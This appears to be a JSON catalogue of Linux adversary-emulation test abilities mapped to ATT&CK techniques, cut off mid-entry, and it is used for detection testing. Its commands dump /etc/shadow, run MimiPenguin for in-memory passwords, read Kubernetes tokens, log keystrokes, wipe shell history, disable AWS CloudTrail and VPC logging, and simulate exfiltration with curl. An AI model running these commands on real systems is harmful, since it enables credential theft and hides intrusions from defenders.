[{"id": "36eecb80-ede3-442b-8774-956e906aff02", "ability_name": "1-min sleep", "description": "Pause all operations to avoid making noise", "tactic": "defense-evasion", "technique": "Virtualization/Sandbox Evasion: Time Based Evasion", "platform": "linux", "requirements": [], "command": "sleep 60", "unlocks": []}, {"id": "f05e54049cfa10bc4018bf9e68676cc8", "ability_name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus", "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable Cloud Logs", "platform": "linux", "requirements": [], "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force", "unlocks": []}, {"id": "647e4465558374490275ec1e6892902a", "ability_name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus", "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable Cloud Logs", "platform": "linux", "requirements": [], "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force", "unlocks": []}, {"id": "e1f9618acc7e0232967e78b6274251da", "ability_name": "AWS - EC2 Enumeration from Cloud Instance", "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n", "tactic": "discovery", "technique": "Cloud Infrastructure Discovery", "platform": "linux", "requirements": [], "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance", "unlocks": []}, {"id": "a26601ea01296a3a01c3854340d1c396", "ability_name": "AWS - Remove VPC Flow Logs using Stratus", "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable Cloud Logs", "platform": "linux", "requirements": [], "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force", "unlocks": []}, {"id": "33f718d05dddc362f6f83802b8b89e93", "ability_name": "AWS - Retrieve EC2 Password Data using stratus", "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n", "tactic": "credential-access", "technique": "Unsecured Credentials", "platform": "linux", "requirements": [], "command": "if [ -f $PathToAtomicsFolder/T1552/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1552/src; echo \"starting warmup\"; ./stratus warmup aws.credential-access.ec2-get-password-data; echo \"starting detonate\"; ./stratus detonate aws.credential-access.ec2-get-password-data --force", "unlocks": []}, {"id": "bdd7294d26bde5f398e6ec5d846cdee5", "ability_name": "Access /etc/passwd (Local)", "description": "/etc/passwd file is accessed in Linux environments\n", "tactic": "credential-access", "technique": "OS Credential Dumping: /etc/passwd and /etc/shadow", "platform": "linux", "requirements": [], "command": "cat /etc/passwd > /tmp/T1003.008.txt; echo \"/tmp/T1003.008.txt\"", "unlocks": ["info.created"]}, {"id": "af30d8506a8aba7a022b687261d22541", "ability_name": "Access /etc/shadow (Local)", "description": "/etc/shadow file is accessed in Linux environments\n", "tactic": "credential-access", "technique": "OS Credential Dumping: /etc/passwd and /etc/shadow", "platform": "linux", "requirements": [], "command": "sudo cat /etc/shadow > /tmp/T1003.008.txt; echo \"/tmp/T1003.008.txt\"", "unlocks": ["info.created"]}, {"id": "9e771275f11328252ac359ee3cc2f32c", "ability_name": "Access /etc/{shadow,passwd} with a standard bin that's not cat", "description": "Dump /etc/passwd and /etc/shadow using ed\n", "tactic": "credential-access", "technique": "OS Credential Dumping: /etc/passwd and /etc/shadow", "platform": "linux", "requirements": [], "command": "echo -e \\\"e /etc/passwd\\\\n,p\\\\ne /etc/shadow\\\\n,p\\\\n\\\" | ed > /tmp/T1003.008.txt", "unlocks": []}, {"id": "838fcd628b987b82c6dff35cd275f916", "ability_name": "Access /etc/{shadow,passwd} with shell builtins", "description": "Dump /etc/passwd and /etc/shadow using bash builtins\n", "tactic": "credential-access", "technique": "OS Credential Dumping: /etc/passwd and /etc/shadow", "platform": "linux", "requirements": [], "command": "function testcat(){ echo \"$(< $1)\"; }; testcat /etc/passwd > /tmp/T1003.008.txt; testcat /etc/shadow > /tmp/T1003.008.txt", "unlocks": []}, {"id": "3939013428dfc0bc10825755685849c2", "ability_name": "Add and delete UFW firewall rules", "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "ufw prepend deny from 1.2.3.4; ufw status numbered", "unlocks": []}, {"id": "f46fcebae29a2bde63127a3bcee47d23", "ability_name": "Add command to .bash_profile", "description": "Adds a command to the .bash_profile file of the current user\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile", "unlocks": []}, {"id": "78c03eac53060523b4eef3ad473d218c", "ability_name": "Add command to .bashrc", "description": "Adds a command to the .bashrc file of the current user\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc", "unlocks": []}, {"id": "dca411f2ebdac351c96959066ac30a68", "ability_name": "Add or copy content to clipboard with xClip", "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n", "tactic": "collection", "technique": "Clipboard Data", "platform": "linux", "requirements": [], "command": "apt install xclip -y; history | tail -n 30 | xclip -sel clip; xclip -o > history.txt", "unlocks": []}, {"id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "tactic": "collection", "technique": "Automated Collection", "platform": "linux", "requirements": [], "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'", "unlocks": []}, {"id": "1091a1dcd359e4ad8d577e7d3d1a18b3", "ability_name": "Append commands user shell profile", "description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "echo '# Atomic Red Team was here... T1546.004' >> ~/.profile", "unlocks": []}, {"id": "01d1dfec9efbf1f20ee65df03209cf5b", "ability_name": "Append to the system shell profile", "description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile", "unlocks": []}, {"id": "596285d5302f5ad6527e7811d620bebf", "ability_name": "At - Schedule a job", "description": "This test submits a command to be run in the future by the `at` daemon.\n", "tactic": "multiple", "technique": "Scheduled Task/Job: At", "platform": "linux", "requirements": [], "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute", "unlocks": []}, {"id": "7ade8854cf5f27a38e6b9d9aba15e22b", "ability_name": "Auditd keylogger", "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n", "tactic": "multiple", "technique": "Input Capture: Keylogging", "platform": "linux", "requirements": [], "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS ; auditctl -a always,exit -F arch=b32 -S execve -k CMDS; whoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\")", "unlocks": []}, {"id": "fe3840e48a28eda88466867b6bb7dbea", "ability_name": "Auditing Configuration Changes on Linux Host", "description": "Emulates modification of auditd configuration files\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Indicator Blocking", "platform": "linux", "requirements": [], "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf; if [ -f \"/etc/auditd.conf\" ]; then sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf; else sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf; fi ; sed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf", "unlocks": []}, {"id": "43b3754c-def4-4699-a673-1d85648fda6a", "ability_name": "Avoid logs", "description": "Stop terminal from logging history", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": ["root"], "command": "> $HOME/.bash_history && unset HISTFILE", "unlocks": ["no.logs"]}, {"id": "d5c3d4d3a33600ba963db53932e355f7", "ability_name": "Base64 Encoded data.", "description": "Utilizing a common technique for posting base64 encoded data.\n", "tactic": "command-and-control", "technique": "Data Encoding: Standard Encoding", "platform": "linux", "requirements": [], "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com", "unlocks": []}, {"id": "b6382bbeb9bd52e48ca7249d30507c9a", "ability_name": "Base64 decoding with Perl", "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n", "tactic": "defense-evasion", "technique": "Deobfuscate/Decode Files or Information", "platform": "linux", "requirements": [], "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'", "unlocks": []}, {"id": "58ef43e598c111afc81ba9a22c6af108", "ability_name": "Base64 decoding with Python", "description": "Use Python to decode a base64-encoded text string and echo it to the console\n", "tactic": "defense-evasion", "technique": "Deobfuscate/Decode Files or Information", "platform": "linux", "requirements": [], "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\"", "unlocks": []}, {"id": "326a9797b0d59b8f6d5a3c384c564b9f", "ability_name": "Base64 decoding with shell utilities", "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n", "tactic": "defense-evasion", "technique": "Deobfuscate/Decode Files or Information", "platform": "linux", "requirements": [], "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"", "unlocks": []}, {"id": "d51f79852d358a701aa4fcd3f9cb8adc", "ability_name": "Bash session based keylogger", "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "tactic": "multiple", "technique": "Input Capture: Keylogging", "platform": "linux", "requirements": [], "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG; echo \"Hello World!\"; cat /tmp/.keyboard.log", "unlocks": []}, {"id": "fcc9496cb4228dd4221f3562da1b49a4", "ability_name": "Binary packed by UPX, with modified headers (linux)", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Software Packing", "platform": "linux", "requirements": [], "command": "cp cc5b6f_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin", "unlocks": []}, {"id": "3a39bf7d2f51a48b68241bcfaaa0ac6a", "ability_name": "Binary simply packed by UPX (linux)", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Software Packing", "platform": "linux", "requirements": [], "command": "cp c92729_test_upx /tmp/packed_bin && /tmp/packed_bin", "unlocks": []}, {"id": "ec7c28b75e9af98aecb33ce5ae14e8c2", "ability_name": "C compile", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Compile After Delivery", "platform": "linux", "requirements": [], "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O e9248b_T1027-004-test.c; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out", "unlocks": []}, {"id": "37ec8aa96775f561e02a954dae1b56bc", "ability_name": "CC compile", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Compile After Delivery", "platform": "linux", "requirements": [], "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out", "unlocks": []}, {"id": "5fab72013505efcd896475f9fe06c280", "ability_name": "Capture Linux Desktop using Import Tool", "description": "Use import command from ImageMagick to collect a full desktop screenshot\n", "tactic": "collection", "technique": "Screen Capture", "platform": "linux", "requirements": [], "command": "if import -help > /dev/null 2>&1; then : ; else sudo apt install graphicsmagick-imagemagick-compat; fi;  ;  import -window root /tmp/T1113_desktop.png", "unlocks": []}, {"id": "4cecc12b906ec724e9f2178fed1e7071", "ability_name": "Capture Passwords with MimiPenguin", "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n", "tactic": "credential-access", "technique": "OS Credential Dumping: Proc Filesystem", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v ldd --version)\" ]; then : ; else sudo apt-get -y install libc-bin; fi; if [ -x \"$(command -v python2 --version)\" ]; then : ; else sudo apt-get -y install python2; fi; if [ -x \"$(command -v strings --version)\" ]; then : ; else sudo apt-get -y install binutils; fi; if [ -f \"/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh\" ]; then : ; else wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz; mkdir /tmp/mimipenguin; tar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin; fi;  ;  sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt; cat /tmp/T1003.007Test3.txt", "unlocks": []}, {"id": "1a877cae5bfda737bd8c362423d1b8e3", "ability_name": "Cat the contents of a Kubernetes service account token file", "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n", "tactic": "credential-access", "technique": "Kubernetes List Secrets", "platform": "linux", "requirements": [], "command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token", "unlocks": []}, {"id": "37df66b74e6c5b241b1f5b45f64676a4", "ability_name": "Change User Password via passwd", "description": "This test changes the user password to hinder access to the account using passwd utility.\n", "tactic": "impact", "technique": "Account Access Removal", "platform": "linux", "requirements": [], "command": "passwd ARTUser", "unlocks": []}, {"id": "5c568978b49775033fc57f7740b84e43", "ability_name": "Change login shell", "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "useradd -s /bin/bash art; cat /etc/passwd |grep ^art; chsh -s /bin/sh art; cat /etc/passwd |grep ^art", "unlocks": []}, {"id": "830bb6ed-9594-4817-b1a1-c298c0f9f425", "ability_name": "Check Chrome", "description": "Check to see if Gooogle Chrome browser is installed", "tactic": "discovery", "technique": "Software Discovery", "platform": "linux", "requirements": [], "command": "which google-chrome", "unlocks": []}, {"id": "9849d956-37ea-49f2-a8b5-f2ca080b315d", "ability_name": "Check Go", "description": "Check to see if GoLang is installed", "tactic": "discovery", "technique": "Software Discovery", "platform": "linux", "requirements": [], "command": "which go", "unlocks": []}, {"id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5", "ability_name": "Check Python", "description": "Check to see what version of python is installed", "tactic": "discovery", "technique": "Software Discovery", "platform": "linux", "requirements": [], "command": "python3 --version;python2 --version;python --version", "unlocks": []}, {"id": "2b403e3d0f5501a43b025c29b7c55d60", "ability_name": "Chmod through c script", "description": "chmods a file using a c script\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "/tmp/T1222002 /tmp/ T1222002", "unlocks": []}, {"id": "0503af9fd6d1fbc9ddc632c91e32d2de", "ability_name": "Chown through c script", "description": "chowns a file to root using a c script\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "sudo /tmp/T1222002own 2a24e8_chown.c", "unlocks": []}, {"id": "a534890161825ac40b02e5f4c82cc5dd", "ability_name": "Clear Bash history (cat dev/null)", "description": "Clears bash history via cat /dev/null\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "cat /dev/null > ~/.bash_history", "unlocks": []}, {"id": "ee72a74844bbc0bcdff17b3ce7157b19", "ability_name": "Clear Bash history (echo)", "description": "Clears bash history via rm\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "echo \"\" > ~/.bash_history", "unlocks": []}, {"id": "6ee56fbf12b8fe3df6bb96aa4abcbe01", "ability_name": "Clear Bash history (ln dev/null)", "description": "Clears bash history via a symlink to /dev/null\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "ln -sf /dev/null ~/.bash_history", "unlocks": []}, {"id": "0b3075a32ff077d5e0c8212ff796ec36", "ability_name": "Clear Bash history (rm)", "description": "Clears bash history via rm\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "rm ~/.bash_history", "unlocks": []}, {"id": "d8f4e4e10f4d6da1b174bb18cb859e6c", "ability_name": "Clear Bash history (truncate)", "description": "Clears bash history via truncate\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "truncate -s0 ~/.bash_history", "unlocks": []}, {"id": "132984234ad769f2b2a36e2b2e36c97f", "ability_name": "Clear History", "description": "Clear Shell History. This technique only affect the bash shell application. \n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "history -c", "unlocks": []}, {"id": "2929fac2296bf1041ba33c86d42d9a5a", "ability_name": "Clear Pagging Cache", "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "free && echo 3 > /proc/sys/vm/drop_caches && free; echo 3> /proc/sys/vm/drop_caches", "unlocks": []}, {"id": "64099c73cfd2e72b45bf167e755e414c", "ability_name": "Clear and Disable Bash History Logging", "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c", "unlocks": []}, {"id": "3f465c72d351789eda3a553334fa43f3", "ability_name": "Clear bash history", "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE 